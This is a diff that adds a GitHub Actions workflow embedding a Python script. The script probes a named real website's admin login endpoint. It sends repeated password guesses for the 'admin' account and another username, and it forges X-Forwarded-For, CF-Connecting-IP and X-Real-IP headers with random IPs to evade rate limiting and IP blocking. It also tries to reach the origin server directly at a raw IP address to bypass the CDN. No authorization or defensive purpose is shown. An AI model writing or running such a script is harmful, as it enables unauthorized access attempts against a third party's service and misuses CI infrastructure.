@@ -1,0 +1,85 @@
+name: probe2
+on:
+  workflow_dispatch:
+    inputs:
+      n: {description: n, required: false, type: string, default: "4"}
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        env:
+          N: ${{ inputs.n }}
+        run: |
+          cat > /tmp/probe2.py <<'PYEOF'
+          import os,json,time,random,socket,urllib.request,urllib.error
+          N=int(os.environ.get("N","4"))
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          LOGIN="https://www.kufaka.com/adminApi/auth/login"
+          RND=random.Random()
+          def rip(): return "%d.%d.%d.%d"%(RND.randint(1,223),RND.randint(0,255),RND.randint(0,255),RND.randint(1,254))
+
+          print("== DNS www.kufaka.com ==",flush=True)
+          try:
+              for ai in socket.getaddrinfo("www.kufaka.com",443,proto=socket.IPPROTO_TCP):
+                  print("DNS", ai[4], flush=True)
+          except Exception as e:
+              print("DNS_ERR",type(e).__name__,str(e)[:80],flush=True)
+
+          def do(tag, url, data=None, method="POST", xff=True, extra=None, sni_host=None):
+              req=urllib.request.Request(url, data=data, method=method)
+              req.add_header("User-Agent",UA)
+              req.add_header("Accept","*/*")
+              if extra:
+                  for k,v in extra.items(): req.add_header(k,v)
+              if xff:
+                  ip=rip(); req.add_header("X-Forwarded-For",ip); req.add_header("CF-Connecting-IP",ip); req.add_header("X-Real-IP",ip)
+              try:
+                  r=urllib.request.urlopen(req,timeout=25)
+                  st=r.status; hh=dict(r.headers); b=r.read()
+              except urllib.error.HTTPError as e:
+                  st=e.code; hh=dict(e.headers)
+                  try: b=e.read()
+                  except Exception: b=b""
+              except Exception as e:
+                  print("%s EXC %s"%(tag, type(e).__name__+":"+str(e)[:100]),flush=True); return
+              bs=b.decode("utf-8","ignore")
+              print("%s st=%s len=%d hdrs=%s body=%r"%(tag,st,len(b),json.dumps(hh),bs[:700]),flush=True)
+
+          AJ={"Content-Type":"application/json","Referer":"https://www.kufaka.com/package/admin/","Origin":"https://www.kufaka.com","Accept":"application/json, text/plain, */*"}
+
+          # A) baseline: kfb-style POST with XFF trio + admin user, spaced
+          for i in range(N):
+              do("A_kfb_admin_%d"%i, LOGIN, data=json.dumps({"username":"admin","password":"zzqx%d"%i}).encode(), extra=AJ, xff=True)
+              time.sleep(1.6)
+          # B) same but rotating username (not admin)
+          for i in range(N):
+              do("B_kfb_user_%d"%i, LOGIN, data=json.dumps({"username":"firstwxx","password":"zzqx%d"%i}).encode(), extra=AJ, xff=True)
+              time.sleep(1.6)
+          # C) NO XFF trio
+          for i in range(N):
+              do("C_noxff_%d"%i, LOGIN, data=json.dumps({"username":"admin","password":"zzqx%d"%i}).encode(), extra=AJ, xff=False)
+              time.sleep(1.6)
+          # D) bare POST, no referer/origin, no xff
+          do("D_bare", LOGIN, data=json.dumps({"username":"admin","password":"x"}).encode(), extra={"Content-Type":"application/json"}, xff=False)
+          time.sleep(1.0)
+          # E) GET homepage / admin page
+          do("E_home", "https://www.kufaka.com/", method="GET", xff=False, extra={"Accept":"text/html"})
+          time.sleep(1.0)
+          do("E_adminpage", "https://www.kufaka.com/package/admin/", method="GET", xff=False, extra={"Accept":"text/html"})
+          time.sleep(1.0)
+          # F) GET the login endpoint (method check)
+          do("F_login_get", LOGIN, method="GET", xff=False, extra={"Accept":"application/json"})
+          time.sleep(1.0)
+          # G) direct-to-origin attempts (lbapi host) with Host header
+          do("G_origin_lbapi_http", "http://154.222.19.143:8080/adminApi/auth/login", data=json.dumps({"username":"admin","password":"x"}).encode(), xff=True, extra=AJ)
+          time.sleep(1.0)
+          # H) gibberish endpoint on same host (does the whole /adminApi 520?)
+          do("H_random_ep", "https://www.kufaka.com/adminApi/auth/loginzzz", data=b"{}", extra={"Content-Type":"application/json"}, xff=True)
+          time.sleep(1.0)
+          print("DONE",flush=True)
+          PYEOF
+          python3 /tmp/probe2.py
